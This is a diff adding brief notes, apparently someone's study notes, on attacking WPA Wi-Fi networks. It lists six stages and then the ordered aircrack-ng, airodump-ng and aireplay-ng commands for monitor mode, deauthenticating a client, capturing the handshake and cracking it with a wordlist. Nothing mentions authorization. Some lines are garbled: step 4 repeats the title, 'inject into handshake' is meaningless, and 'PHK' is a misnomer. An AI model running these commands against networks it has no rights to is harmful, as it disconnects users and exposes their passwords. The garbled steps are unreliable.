@@ -1,0 +1,35 @@
+6 Stages of Wireless Hacking
+
+1. Place
+    - Place wireless card into monitor mode.
+
+2. Discover
+    - Discover information about network
+        * Channel
+        * BSSID/MAC
+
+3. Select
+    - Select network and capture data.
+
+4. Perform
+    - Perform deauth attack6 Stages of Wireless Hacking.
+
+5. Capture
+    - Capture WPA handshake and inject into handshake.
+
+6. Attempt
+    - Attempt to crack the handshake hash (WPA 2 PHK).
+
+Commands(in order)
+    - iwconfig (To see active wifi networks)
+    - airmon-ng check kill (kills processes that may interfere with monitoring wifi)
+    - airmon-ng start wlan0 (Activates wifi sniffer airmon-ng)
+    - airodump-ng wlan0mon (Will show all the devices on the wifi network)
+        * The more positive the negative number, the closer the device.
+        * Look for TP-Link for some reason.
+    (Trying to capture handshake)
+    - airodump-ng -c <channel> --bssid <mac address> -w capture(this is the filename to be stored in) wlan0mon
+    (Deauth attack to speed up handshake)[This will disconnect a person for a short amount of time, so dont spam]
+    - aireplay-ng -0(deauth) 1(num times run) -a <MAC address> -c(client/STATION) <Station address> wlan0mon
+    - aircrack-ng -w wordlist.txt -b <MAC addreess> <capture file name>
+
